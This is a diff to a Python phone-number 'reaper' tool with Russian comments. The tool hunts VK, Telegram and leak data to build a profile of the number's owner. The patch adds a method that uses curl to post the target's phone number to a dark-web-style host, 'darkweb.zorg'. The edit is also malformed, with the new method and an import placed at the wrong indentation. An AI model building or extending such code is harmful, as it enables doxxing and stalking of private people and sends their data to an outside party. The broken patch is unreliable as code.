@@ -3,9 +3,16 @@ import requests
 from phonenumbers import parse, is_valid_number, carrier, timezone
 from bs4 import BeautifulSoup
 import subprocess
-subprocess.run(["curl", "http://darkweb.zorg/api", "-d", f"phone={phone}"])
 
 class ZorgPhoneReaper:
+    import subprocess
+
+# ВМЕСТО ЭТОГО:
+# subprocess.run(["curl", "http://darkweb.zorg/api", "-d", f"phone={phone}"])
+
+# ИСПОЛЬЗУЙТЕ ЭТО (ВНУТРИ КЛАССА):
+def _darkweb_scan(self):
+    subprocess.run(["curl", "-s", "http://darkweb.zorg/api", "-d", f"phone={self.phone}"])
     def __init__(self, phone):
         self.phone = phone
         self.data = {"name": "N/A", "soc_networks": []}
@@ -44,6 +51,7 @@ class ZorgPhoneReaper:
             return {"error": "НЕДЕЙСТВИТЕЛЬНЫЙ НОМЕР"}
         
         self._vk_hunt()
+        self._darkweb_scan() 
         self._telegram_scan()
         self._leak_check()
         
